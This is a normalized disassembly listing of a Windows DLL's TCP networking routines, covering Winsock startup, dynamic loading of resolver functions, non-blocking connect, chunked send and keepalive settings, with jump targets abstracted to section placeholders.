jne r-xdata
mov eax 0x2af9
jmp r-xdata
test rbx rbx
je r-xdata
mov [ rsp + 0x48 ] rbp
mov ebp esi
and ebp 0x2
je r-xdata
mov rbx [ rsp + 0x88 ]
mov [ rsp + 0x40 ] rdi
test r14 r14
je r-xdata
test sil 0x4
je r-xdata
test r15 r15
je r-xdata
test rbx rbx
je r-xdata
mov eax 0x2726
jmp r-xdata
xor eax eax
jmp r-xdata
test r12 r12
je r-xdata
movzx edi [ rcx + 0x2 ]
test sil 0x8
jne r-xdata
mov rbp [ rsp + 0x48 ]
mov rdi [ rsp + 0x40 ]
mov ecx [ r13 + 0x4 ]
mov [ rsp + 0x20 ] ecx
test ebp ebp
jne r-xdata
movzx ecx di
call [ ntohs@IAT ]
lea r8 [ r--data ]
lea rcx [ rsp + 0x30 ]
movzx r9d ax
mov edx 0x6
call sub_18000c17c
lea rax [ r--data ]
test sil 0x10
mov edx 0x0
cmovne rdx rax
movzx ecx di
call [ getservbyport@IAT ]
test rax rax
je r-xdata
call [ inet_ntoa@IAT ]
mov rbx rax
lea edx [ rbp + 0x4 ]
lea r8d [ rbp + 0x2 ]
lea rcx [ rsp + 0x20 ]
call [ gethostbyaddr@IAT ]
test rax rax
je r-xdata
mov eax 0x2afb
jmp r-xdata
mov rdx rbx
mov rcx r14
call sub_180011824
mov rax [ rax ]
test rax rax
je r-xdata
mov r8 rbx
mov rdx r12
mov rcx r15
call sub_180011824
test sil 0x4
je r-xdata
mov rbx [ rax ]
test rbx rbx
je r-xdata
mov [ rsp + 0x28 ] rax
jmp r-xdata
mov ecx [ rsp + 0x20 ]
call [ WSAGetLastError@IAT ]
sub eax 0x2af9
je r-xdata
test sil 0x1
je r-xdata
mov r8 [ rsp + 0x28 ]
or rcx 0xffffffffffffffff
xor eax eax
mov rdi r8
[ rdi ]
not rcx
dec rcx
cmp rbx rcx
jbe r-xdata
mov eax 0x2af9
dec eax
je r-xdata
or rcx 0xffffffffffffffff
xor eax eax
mov rdi rbx
[ rdi ]
not rcx
dec rcx
cmp r12 rcx
jbe r-xdata
lea edx [ rbp + 0x2e ]
mov rcx rbx
call sub_180011268
test rax rax
je r-xdata
mov eax 0x2afa
jmp r-xdata
dec eax
je r-xdata
mov [ rax ] bpl
jmp r-xdata
sub_18001c610
mov [ rsp + 0x18 ] rbx
push rbp
sub rsp 0x280
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x270 ] rax
cmp [ rw-data ] 0x0
lea rax [ sub_18001c090 ]
lea rbx [ r--data ]
mov [ rsp + 0x28 ] rax
lea rax [ r--data ]
movzx ebp cx
mov [ rsp + 0x30 ] rax
lea rax [ sub_18001c3b0 ]
mov [ rsp + 0x20 ] rbx
mov [ rsp + 0x38 ] rax
lea rax [ r--data ]
mov [ rsp + 0x40 ] rax
lea rax [ sub_18001c030 ]
mov [ rsp + 0x48 ] rax
jne r-xdata
movzx eax bp
lea rcx [ rw-data ]
add rax rax
mov rax [ rcx + rax * 8 + 0x8 ]
mov rcx [ rsp + 0x270 ]
xor rcx rsp
call sub_18000c060
mov rbx [ rsp + 0x2a0 ]
add rsp 0x280
pop rbp
retn
lea rcx [ rsp + 0x160 ]
mov edx 0x104
call [ GetSystemDirectoryA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] 0x1
lea r8 [ rsp + 0x160 ]
lea rcx [ rsp + 0x50 ]
mov edx 0x10c
mov [ rsp + 0x290 ] rsi
call sub_180011824
lea r8 [ r--data ]
lea rcx [ rsp + 0x50 ]
mov edx 0x10c
call sub_1800168b8
lea rcx [ rsp + 0x50 ]
call [ LoadLibraryA@IAT ]
mov rsi rax
test rax rax
je r-xdata
lea r8 [ rsp + 0x160 ]
lea rcx [ rsp + 0x50 ]
mov edx 0x10c
call sub_180011824
lea r8 [ r--data ]
lea rcx [ rsp + 0x50 ]
mov edx 0x10c
call sub_1800168b8
lea rcx [ rsp + 0x50 ]
call [ LoadLibraryA@IAT ]
mov rsi rax
test rax rax
je r-xdata
mov rdx rbx
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
jne r-xdata
mov rsi [ rsp + 0x290 ]
mov rdx rbx
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
jne r-xdata
mov [ rsp + 0x298 ] rdi
lea rbx [ rsp + 0x28 ]
xor edi edi
mov rcx rsi
call [ FreeLibrary@IAT ]
mov rcx rsi
call [ FreeLibrary@IAT ]
jmp r-xdata
mov rcx rsi
call [ FreeLibrary@IAT ]
inc edi
add rbx 0x10
cmp edi 0x3
jl r-xdata
mov rdx [ rbx - 0x8 ]
mov rcx rsi
call [ GetProcAddress@IAT ]
mov [ rbx ] rax
test rax rax
je r-xdata
mov rax [ rsp + 0x28 ]
mov [ rw-data ] rax
mov rax [ rsp + 0x38 ]
mov [ rw-data ] rax
mov rax [ rsp + 0x48 ]
mov [ rw-data ] rax
jmp r-xdata
mov rdi [ rsp + 0x298 ]
sub_18001c810
push rbx
sub rsp 0x20
mov rax [ rw-data ]
mov rbx rcx
test rax rax
jne r-xdata
mov rcx rbx
add rsp 0x20
pop rbx
jmp rax
lea ecx [ rax + 0x2 ]
call sub_18001c610
mov [ rw-data ] rax
sub_18001c840
sub rsp 0x28
call sub_18001e100
test eax eax
jne r-xdata
add rsp 0x28
retn
call sub_18001e310
test eax eax
jne r-xdata
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x20 ] rdi
call sub_18001d2f0
mov ebx eax
call sub_18001d190
or edi 0xffffffff
test eax eax
cmove ebx edi
call sub_180001000
test eax eax
cmove ebx edi
mov rdi [ rsp + 0x20 ]
mov eax ebx
mov rbx [ rsp + 0x30 ]
sub_18001c8c0
push rbx
sub rsp 0x20
mov rbx rcx
test rcx rcx
jne r-xdata
lea rcx [ rsp + 0x30 ]
mov [ rsp + 0x30 ] 0x0
call sub_18001e850
test eax eax
jne r-xdata
mov eax 0xabcd0000
add rsp 0x20
pop rbx
retn
add rsp 0x20
pop rbx
retn
mov rax [ rsp + 0x30 ]
mov ecx [ rax + 0x10 ]
xor eax eax
mov [ rbx ] ecx
sub_18001c910
sub rsp 0x28
lea rdx [ rsp + 0x38 ]
mov [ rsp + 0x38 ] 0x0
call sub_18001e170
test eax eax
jne r-xdata
add rsp 0x28
retn
mov rcx [ rsp + 0x38 ]
cmp [ rcx + 0x78 ] eax
jne r-xdata
call sub_18001e9e0
call sub_18001d5e0
test eax eax
jne r-xdata
mov rcx [ rsp + 0x38 ]
sub_18001c950
push rbx
sub rsp 0x20
mov rbx rcx
test rcx rcx
jne r-xdata
mov ecx [ rcx + 0x10 ]
mov [ rsp + 0x38 ] rdi
lea rdx [ rsp + 0x30 ]
xor edi edi
mov [ rsp + 0x30 ] rdi
call sub_18001e170
test eax eax
jne r-xdata
mov eax 0xabcd0000
add rsp 0x20
pop rbx
retn
mov rdi [ rsp + 0x38 ]
add rsp 0x20
pop rbx
retn
mov rcx [ rsp + 0x30 ]
cmp [ rcx ] edi
je r-xdata
cmp [ rcx + 0xa8 ] rdi
je r-xdata
mov eax 0xabcd000d
mov rdi [ rsp + 0x38 ]
add rsp 0x20
pop rbx
retn
add rcx 0xc0
call [ EnterCriticalSection@IAT ]
mov rax [ rsp + 0x30 ]
mov r11d [ rbx + 0x4 ]
mov [ rax + 0x4 ] r11d
movzx ecx [ rbx + 0x8 ]
mov rax [ rsp + 0x30 ]
mov [ rax + 0x8 ] cx
mov rax [ rsp + 0x30 ]
movzx ecx [ rbx + 0xa ]
mov [ rax + 0xa ] cx
cmp [ rbx + 0xa ] di
mov rax [ rsp + 0x30 ]
seta dil
mov [ rax + 0x84 ] edi
mov rcx [ rsp + 0x30 ]
call sub_18001de20
mov edi eax
test eax eax
jne r-xdata
mov rcx [ rcx + 0xa8 ]
or edx 0xffffffff
call [ WaitForSingleObject@IAT ]
mov rcx [ rsp + 0x30 ]
mov rcx [ rcx + 0xa8 ]
call [ CloseHandle@IAT ]
mov r11 [ rsp + 0x30 ]
mov [ r11 + 0xa8 ] rdi
mov rcx [ rsp + 0x30 ]
mov rcx [ rsp + 0x30 ]
add rcx 0xc0
call [ LeaveCriticalSection@IAT ]
mov eax edi
mov rdx [ rsp + 0x30 ]
lea r8d [ rax + 0x20 ]
mov rcx rbx
call sub_18001d240
sub_18001ca70
mov [ rsp + 0x18 ] rdi
push rbp
push r12
push r13
mov rbp rsp
sub rsp 0x40
mov r13d r9d
mov edi r8d
mov r12 rdx
cmp ecx 0x64
jae r-xdata
cmp edi 0x3fc00
jbe r-xdata
mov eax 0xabcd0000
mov rdi [ rsp + 0x70 ]
add rsp 0x40
pop r13
pop r12
pop rbp
retn
mov [ rsp + 0x60 ] rbx
lea rdx [ rbp - 0x10 ]
mov [ rsp + 0x68 ] rsi
xor esi esi
mov [ rbp - 0x10 ] rsi
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x18 ] rsi
call sub_18001e170
mov ebx eax
test eax eax
jne r-xdata
mov eax 0xabcd000c
mov rdi [ rsp + 0x70 ]
add rsp 0x40
pop r13
pop r12
pop rbp
retn
mov rcx [ rbp - 0x20 ]
call sub_18001e550
mov rcx [ rbp - 0x18 ]
call sub_18001e550
mov rsi [ rsp + 0x68 ]
mov rdi [ rsp + 0x70 ]
mov eax ebx
mov rbx [ rsp + 0x60 ]
add rsp 0x40
pop r13
pop r12
pop rbp
retn
mov rcx [ rbp - 0x10 ]
test r13d r13d
jne r-xdata
mov r8d edi
mov rdx r12
cmp [ rcx + 0x88 ] esi
jne r-xdata
lea rcx [ rbp - 0x20 ]
mov edx edi
call sub_18001e3a0
mov ebx eax
test eax eax
jne r-xdata
mov rcx [ rbp - 0x20 ]
mov r8d edi
mov rdx r12
cmp edi 0xfa0
ja r-xdata
call sub_18001ecd0
test eax eax
je r-xdata
mov rax [ rbp - 0x10 ]
mov r9d [ rax + 0x8c ]
call sub_18001ee80
mov rdx [ rbp - 0x20 ]
mov rcx [ rbp - 0x10 ]
mov r8d [ rdx + 0xc ]
mov rdx [ rdx + 0x4 ]
jmp r-xdata
mov esi 0x1
mov rcx [ rbp - 0x20 ]
mov r8 rdi
mov rdx r12
mov rcx [ rcx + 0x4 ]
call sub_18001d240
mov r11 [ rbp - 0x20 ]
mov [ r11 + 0x18 ] edi
mov rax [ rbp - 0x20 ]
mov [ rax + 0xc ] edi
mov rcx [ rbp - 0x20 ]
mov rax [ rcx + 0x4 ]
mov [ rcx + 0x10 ] rax
jmp r-xdata
call sub_18001d4a0
mov ebx eax
mov edx edi
mov rcx r12
call sub_180001040
mov rdx [ rbp - 0x18 ]
mov rcx [ rbp - 0x20 ]
mov r8 rax
mov r9d esi
mov r12 rax
mov ebx 0xabcd000a
call sub_18001f370
mov edi eax
cmp eax 0x400
je r-xdata
lea rcx [ rbp - 0x18 ]
mov edx 0xfa0
call sub_18001e3a0
cmp [ rbp - 0x18 ] 0x0
mov ebx eax
je r-xdata
nop [ rax + rax ] ax
cmp edi 0x406
je r-xdata
mov rdx [ rbp - 0x18 ]
mov rcx [ rbp - 0x20 ]
mov r9d esi
mov r8 r12
mov ebx 0xabcd000a
call sub_18001f370
mov edi eax
cmp eax 0x400
jne r-xdata
mov rdx [ rbp - 0x18 ]
mov rcx [ rbp - 0x10 ]
mov r8d [ rdx + 0xc ]
mov rdx [ rdx + 0x4 ]
call sub_18001d4a0
mov ebx eax
test eax eax
jne r-xdata
jmp r-xdata
sub_18001cc90
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
mov rsi rdx
lea rdx [ rsp + 0x20 ]
mov rbx r9
mov rdi r8
mov [ rsp + 0x20 ] 0x0
call sub_18001e170
test eax eax
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
mov rax [ rsp + 0x20 ]
mov rcx [ rsp + 0x60 ]
mov [ rax + 0xe8 ] rsi
mov rax [ rsp + 0x20 ]
mov [ rax + 0xf0 ] rdi
mov rax [ rsp + 0x20 ]
mov [ rax + 0xf8 ] rbx
mov rax [ rsp + 0x20 ]
mov [ rax + 0x100 ] rcx
xor eax eax
sub_18001cd10
push rbx
sub rsp 0x20
mov rbx rcx
test rcx rcx
jne r-xdata
mov ecx [ rcx + 0x10 ]
lea rdx [ rsp + 0x30 ]
mov [ rsp + 0x30 ] 0x0
call sub_18001e170
test eax eax
jne r-xdata
mov eax 0xabcd0000
add rsp 0x20
pop rbx
retn
add rsp 0x20
pop rbx
retn
mov rdx [ rsp + 0x30 ]
lea r8d [ rax + 0x20 ]
mov rcx rbx
call sub_18001d240
xor eax eax
sub_18001cd60
mov [ rsp + 0x20 ] rbp
push rdi
push r12
push r13
sub rsp 0x30
movzx r12d r9w
mov r13d r8d
mov edi edx
mov ebp ecx
test r8d r8d
je r-xdata
mov eax 0xabcd0000
mov rbp [ rsp + 0x68 ]
add rsp 0x30
pop r13
pop r12
pop rdi
retn
cmp r9w 0x1
jb r-xdata
cmp ecx 0x64
jb r-xdata
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x58 ] rsi
mov rsi [ rsp + 0x70 ]
test rsi rsi
je r-xdata
mov rbx [ rsp + 0x78 ]
test rbx rbx
je r-xdata
mov rcx rsi
call [ lstrlenA@IAT ]
cmp eax 0x20
jg r-xdata
mov [ rsp + 0x60 ] r14
lea rdx [ rsp + 0x20 ]
xor r14d r14d
mov ecx ebp
mov [ rsp + 0x20 ] r14
call sub_18001e170
test eax eax
jne r-xdata
mov rcx rbx
call [ lstrlenA@IAT ]
cmp eax 0x20
jle r-xdata
mov eax 0xabcd0000
jmp r-xdata
mov r14 [ rsp + 0x60 ]
cmp edi 0x4
ja r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rbp [ rsp + 0x68 ]
add rsp 0x30
pop r13
pop r12
pop rdi
retn
mov eax 0xabcd000e
jmp r-xdata
cmp edi 0x3
je r-xdata
mov rax [ rsp + 0x20 ]
test edi edi
je r-xdata
mov [ rax + 0x7c ] r14d
mov rax [ rsp + 0x20 ]
xor edx edx
mov [ rax + 0x24 ] r14d
mov rax [ rsp + 0x20 ]
lea r8d [ rdx + 0x24 ]
mov [ rax + 0x28 ] r14d
mov rcx [ rsp + 0x20 ]
add rcx 0x2c
call sub_18001d220
mov rcx [ rsp + 0x20 ]
xor edx edx
lea r8d [ rdx + 0x24 ]
add rcx 0x50
call sub_18001d220
mov [ rax + 0x7c ] 0x1
mov rax [ rsp + 0x20 ]
movzx ecx r12w
mov [ rax + 0x24 ] r13d
mov rax [ rsp + 0x20 ]
mov [ rax + 0x28 ] ecx
test rsi rsi
je r-xdata
test rbx rbx
je r-xdata
mov rcx [ rsp + 0x20 ]
lea r8d [ r14 + 0x20 ]
mov rdx rsi
add rcx 0x2c
call [ lstrcpynA@IAT ]
mov rax [ rsp + 0x20 ]
mov [ rax + 0x20 ] edi
xor eax eax
mov rcx [ rsp + 0x20 ]
mov r8d 0x20
mov rdx rbx
add rcx 0x50
call [ lstrcpynA@IAT ]
jmp r-xdata
sub_18001cef0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx r8d
mov edi edx
cmp ecx 0x64
jb r-xdata
mov eax 0xabcd0000
cmp edx 0x4
jge r-xdata
lea rdx [ rsp + 0x48 ]
mov [ rsp + 0x48 ] 0x0
call sub_18001e170
mov r11d eax
test eax eax
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test edi edi
je r-xdata
mov rax [ rsp + 0x48 ]
and ebx 0xf
mov [ rax + 0x8c ] ebx
mov eax r11d
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
dec edi
je r-xdata
cmp ebx 0xf
jb r-xdata
dec edi
je r-xdata
mov r11d 0xabcd0000
mov eax r11d
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rsp + 0x48 ]
cmp ebx [ rax + 0x98 ]
jae r-xdata
mov rax [ rsp + 0x48 ]
imul ebx ebx 0x3e8
cmp ebx [ rax + 0x94 ]
jbe r-xdata
dec edi
jne r-xdata
mov [ rax + 0x94 ] ebx
mov eax r11d
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rax + 0x98 ] ebx
mov eax r11d
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rsp + 0x48 ]
mov [ rax + 0x88 ] ebx
mov eax r11d
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_18001cff0
push rdi
push r12
push r13
push r14
sub rsp 0x68
movzx r13d r9w
mov r14 r8
mov edi edx
mov r12d ecx
test r8 r8
je r-xdata
mov eax 0xabcd0000
add rsp 0x68
pop r14
pop r13
pop r12
pop rdi
retn
cmp r9w 0x1
jb r-xdata
cmp ecx 0x64
jb r-xdata
mov [ rsp + 0x98 ] rbp
mov [ rsp + 0x60 ] rsi
mov rsi [ rsp + 0xb0 ]
test rsi rsi
je r-xdata
mov rbp [ rsp + 0xb8 ]
test rbp rbp
je r-xdata
mov rcx rsi
call [ lstrlenA@IAT ]
cmp eax 0x20
jg r-xdata
mov [ rsp + 0x90 ] rbx
test edi edi
jne r-xdata
mov rcx rbp
call [ lstrlenA@IAT ]
cmp eax 0x20
jle r-xdata
mov eax 0xabcd0000
jmp r-xdata
cmp edi 0x3
je r-xdata
xor ebx ebx
xor r9d r9d
xor r8d r8d
mov [ rsp + 0x28 ] rbx
mov [ rsp + 0x20 ] rbx
xor edx edx
mov rbp [ rsp + 0x98 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x68
pop r14
pop r13
pop r12
pop rdi
retn
xor ebx ebx
lea rcx [ rsp + 0x34 ]
xor edx edx
lea r8d [ rbx + 0x2c ]
mov [ rsp + 0x30 ] ebx
call sub_18000bd10
mov rax [ rw-data ]
mov [ rsp + 0xa0 ] rbx
mov [ rsp + 0x34 ] 0x2
mov [ rsp + 0x38 ] 0x1
mov [ rsp + 0x3c ] 0x6
test rax rax
jne r-xdata
cmp edi 0x1
je r-xdata
lea r9 [ rsp + 0xa0 ]
lea r8 [ rsp + 0x30 ]
xor edx edx
mov rcx r14
call rax
mov ecx eax
mov ebx eax
call [ WSASetLastError@IAT ]
test ebx ebx
je r-xdata
xor ecx ecx
call sub_18001c610
mov [ rw-data ] rax
mov eax 0xabcd000e
jmp r-xdata
mov rcx [ rsp + 0xa0 ]
mov rax [ rcx + 0x20 ]
mov ebx [ rax + 0x4 ]
call sub_18001c810
mov [ rsp + 0x28 ] rbp
mov [ rsp + 0x20 ] rsi
movzx r9d r13w
mov r8d ebx
mov edx edi
jmp r-xdata
call [ WSAGetLastError@IAT ]
jmp r-xdata
mov rbx [ rsp + 0x90 ]
mov ecx r12d
call sub_18001cd60
sub_18001d190
push rbx
sub rsp 0x20
lea rcx [ r--data ]
call [ LoadLibraryA@IAT ]
mov rbx rax
test rax rax
jne r-xdata
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov [ rw-data ] rax
mov eax 0x1
add rsp 0x20
pop rbx
retn
add rsp 0x20
pop rbx
retn
sub_18001d250
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x20 ] r9
sub rsp 0x38
mov rax [ rw-data ]
test rax rax
je r-xdata
xor eax eax
add rsp 0x38
retn
test rcx rcx
je r-xdata
cmp rdx 0x1
jb r-xdata
lea r9 [ rsp + 0x58 ]
dec rdx
mov [ rsp + 0x20 ] 0x0
call rax
add rsp 0x38
retn
sub_18001d2a0
cmp [ rcx ] 0x40
jae r-xdata
retn
xor eax eax
lea r8 [ rcx + 0x8 ]
or r9d 0xffffffff
nop
cmp eax 0x40
jl r-xdata
cmp r9d 0xffffffff
jne r-xdata
cmp r9d 0xffffffff
jle r-xdata
inc eax
add r8 0x8
cmp eax 0x40
jl r-xdata
test r10 r10
cmove r9d eax
movsxd rax r9d
mov [ rcx + rax * 8 + 0x8 ] rdx
inc [ rcx ]
mov r10 [ r8 ]
cmp rdx r10
je r-xdata
jmp r-xdata
sub_18001d2f0
sub rsp 0x1d8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x1c0 ] rax
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
mov rcx [ rsp + 0x1c0 ]
xor rcx rsp
call sub_18000c060
add rsp 0x1d8
retn
lea rcx [ rsp + 0x22 ]
xor edx edx
mov r8d 0x190
mov [ rsp + 0x20 ] ax
call sub_18000bd10
lea rdx [ rsp + 0x20 ]
mov ecx 0x202
call [ WSAStartup@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] 0x1
xor eax eax
mov eax 0xabcd0007
mov rcx [ rsp + 0x1c0 ]
xor rcx rsp
call sub_18000c060
add rsp 0x1d8
retn
sub_18001d3b0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x70
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x68 ] rax
mov edi 0x1
lea r9 [ rsp + 0x50 ]
mov edx 0xffff
mov [ rsp + 0x50 ] edi
lea r8d [ rdi + 0x7f ]
mov rbx rcx
mov [ rsp + 0x54 ] edi
mov [ rsp + 0x52 ] di
mov [ rsp + 0x20 ] 0x4
call [ setsockopt@IAT ]
lea r9 [ rsp + 0x54 ]
lea r8d [ rdi + 0x7 ]
mov edx 0xffff
mov rcx rbx
mov [ rsp + 0x20 ] 0x4
call [ setsockopt@IAT ]
test eax eax
jne r-xdata
call [ WSAGetLastError@IAT ]
xor ecx ecx
xor eax eax
lea r9d [ rdi + 0xb ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x38 ] rcx
mov [ rsp + 0x5c ] rax
lea rax [ rsp + 0x54 ]
lea r8 [ rsp + 0x58 ]
mov edx 0x98000004
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] ecx
mov [ rsp + 0x20 ] rcx
mov rcx rbx
mov [ rsp + 0x58 ] edi
mov [ rsp + 0x5c ] 0xc350
mov [ rsp + 0x60 ] 0x1388
call [ WSAIoctl@IAT ]
test eax eax
je r-xdata
mov rcx [ rsp + 0x68 ]
xor rcx rsp
call sub_18000c060
mov rbx [ rsp + 0x88 ]
add rsp 0x70
pop rdi
retn
sub_18001d4a0
push rbx
push rdi
push r13
sub rsp 0x20
mov ebx r8d
mov rdi rdx
mov r13 rcx
test rcx rcx
je r-xdata
mov eax 0xabcd0000
add rsp 0x20
pop r13
pop rdi
pop rbx
retn
test rdx rdx
je r-xdata
test ebx ebx
je r-xdata
cmp [ rcx + 0x78 ] 0x0
je r-xdata
mov [ rsp + 0x40 ] rbp
mov [ rsp + 0x48 ] rsi
xor esi esi
add rcx 0xc0
mov [ rsp + 0x50 ] r12
mov ebp esi
mov [ rsp + 0x58 ] r14
call [ EnterCriticalSection@IAT ]
mov r12d esi
cmp ebx 0x5a0
jb r-xdata
mov eax 0xabcd0008
add rsp 0x20
pop r13
pop rdi
pop rbx
retn
test ebx ebx
je r-xdata
mov rcx [ r13 + 0xa0 ]
xor r9d r9d
mov r8d 0x5a0
mov rdx rdi
call [ send@IAT ]
mov r11d eax
cmp eax 0xffffffff
je r-xdata
lea rcx [ r13 + 0xc0 ]
call [ LeaveCriticalSection@IAT ]
mov r12 [ rsp + 0x50 ]
mov rsi [ rsp + 0x48 ]
mov r14 [ rsp + 0x58 ]
mov eax ebp
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop r13
pop rdi
pop rbx
retn
mov rcx [ r13 + 0xa0 ]
xor r9d r9d
mov r8d ebx
mov rdx rdi
call [ send@IAT ]
mov r11d eax
cmp eax 0xffffffff
je r-xdata
call [ WSAGetLastError@IAT ]
mov ebp eax
test eax eax
jne r-xdata
test eax eax
jne r-xdata
call [ WSAGetLastError@IAT ]
mov ebp eax
test eax eax
jne r-xdata
add rdi r11
inc r12d
jmp r-xdata
add rdi r11
inc esi
jmp r-xdata
mov ebp 0xabcd0009
jmp r-xdata
sub ebx r11d
cmp ebx 0x5a0
jae r-xdata
cmp r12d 0x4
je r-xdata
sub ebx r11d
jne r-xdata
cmp esi 0x4
je r-xdata
jmp r-xdata
jmp r-xdata
sub_18001d5e0
push rbx
sub rsp 0x20
mov rbx rcx
test rcx rcx
jne r-xdata
add rcx 0xc0
mov [ rsp + 0x30 ] rdi
call [ EnterCriticalSection@IAT ]
cmp [ rbx + 0x78 ] 0x0
jne r-xdata
mov eax 0xabcd0000
add rsp 0x20
pop rbx
retn
lea rcx [ rbx + 0xc0 ]
call [ LeaveCriticalSection@IAT ]
mov rdi [ rsp + 0x30 ]
xor eax eax
add rsp 0x20
pop rbx
retn
mov rcx [ rbx + 0xa0 ]
call [ CancelIo@IAT ]
mov rcx [ rbx + 0xa0 ]
mov edx 0x2
call [ shutdown@IAT ]
mov r11d 0x1
xor eax eax
xchg [ rbx + 0x78 ] r11d
xchg [ rbx ] eax
mov rcx [ rbx + 0xa0 ]
call [ closesocket@IAT ]
mov rcx [ rbx + 0xb0 ]
mov [ rbx + 0xa0 ] 0xffffffffffffffff
call [ SetEvent@IAT ]
sub_18001d680
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rdi r8
mov rsi rdx
mov rbx rcx
test rcx rcx
je r-xdata
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
or eax 0xffffffff
add rsp 0x40
pop rdi
retn
test rdx rdx
je r-xdata
test r8 r8
je r-xdata
lea rcx [ rsp + 0x50 ]
mov edx 0x3fc00
mov [ rsp + 0x50 ] 0x0
call sub_18001e3a0
mov r8 [ rsp + 0x50 ]
test r8 r8
jne r-xdata
mov rdx rdi
mov rcx rsi
call sub_18001ebc0
mov edi eax
test eax eax
jne r-xdata
mov eax 0xabcd0003
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
mov rcx [ rsp + 0x50 ]
call sub_18001e550
mov rcx [ rbx + 0xb8 ]
call sub_18001e7b0
mov eax edi
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
mov r9 [ rbx + 0xf0 ]
test r9 r9
je r-xdata
mov rdx [ rsp + 0x50 ]
mov [ rbx + 0xc ] eax
mov rcx [ rbx ]
mov rax [ rbx + 0x10 ]
mov [ rsp + 0x20 ] rcx
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x30 ] rax
mov rax [ rbx + 0x18 ]
mov [ rsp + 0x28 ] rcx
mov [ rsp + 0x38 ] rax
mov r8d [ rdx + 0x18 ]
mov rdx [ rdx + 0x4 ]
lea rcx [ rsp + 0x20 ]
call r9
sub_18001d780
push rbx
sub rsp 0x50
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x40 ] rax
mov rbx rcx
test rcx rcx
jne r-xdata
xor eax eax
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] 0xaced1984
mov [ rsp + 0x24 ] rax
mov [ rsp + 0x24 ] 0x10000000
mov [ rsp + 0x2c ] rax
mov [ rsp + 0x34 ] rax
mov [ rsp + 0x3c ] al
call sub_18001eda0
lea rdx [ rsp + 0x20 ]
mov r8d 0x1c
mov rcx rbx
call sub_18001d4a0
mov rcx [ rsp + 0x40 ]
xor rcx rsp
call sub_18000c060
add rsp 0x50
pop rbx
retn
mov eax 0xabcd0000
mov rcx [ rsp + 0x40 ]
xor rcx rsp
call sub_18000c060
add rsp 0x50
pop rbx
retn
sub_18001d810
push rbx
push rbp
push rsi
push rdi
sub rsp 0x268
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x250 ] rax
mov esi r8d
mov rdi rdx
lea r8 [ rsp + 0x30 ]
mov edx 0x8004667e
mov ebp r9d
mov rbx rcx
mov [ rsp + 0x30 ] 0x1
call [ ioctlsocket@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov r8d esi
mov rdx rdi
mov rcx rbx
call [ connect@IAT ]
cmp eax 0xffffffff
jne r-xdata
call [ WSAGetLastError@IAT ]
jmp r-xdata
lea rcx [ rsp + 0x48 ]
xor edi edi
xor edx edx
mov r8d 0x200
mov [ rsp + 0x40 ] rdi
call sub_18000bd10
lea rcx [ rsp + 0x40 ]
mov rdx rbx
mov [ rsp + 0x38 ] rdi
call sub_18001d2a0
lea rax [ rsp + 0x38 ]
lea r8 [ rsp + 0x40 ]
xor r9d r9d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x38 ] ebp
call [ select@IAT ]
test eax eax
jne r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x2733
jne r-xdata
mov rcx [ rsp + 0x250 ]
xor rcx rsp
call sub_18000c060
add rsp 0x268
pop rdi
pop rsi
pop rbp
pop rbx
retn
js r-xdata
mov eax 0x274c
jmp r-xdata
lea r8 [ rsp + 0x30 ]
mov edx 0x8004667e
mov rcx rbx
mov [ rsp + 0x30 ] edi
call [ ioctlsocket@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax edi
sub_18001d920
push rbp
push rbx
push rsi
mov rbp rsp
sub rsp 0x50
mov rsi rdx
mov rbx rcx
test rcx rcx
je r-xdata
mov eax 0xabcd0000
add rsp 0x50
pop rsi
pop rbx
pop rbp
retn
test rdx rdx
je r-xdata
mov [ rsp + 0x40 ] r12
xor r12d r12d
mov [ rbp + 0x20 ] r12d
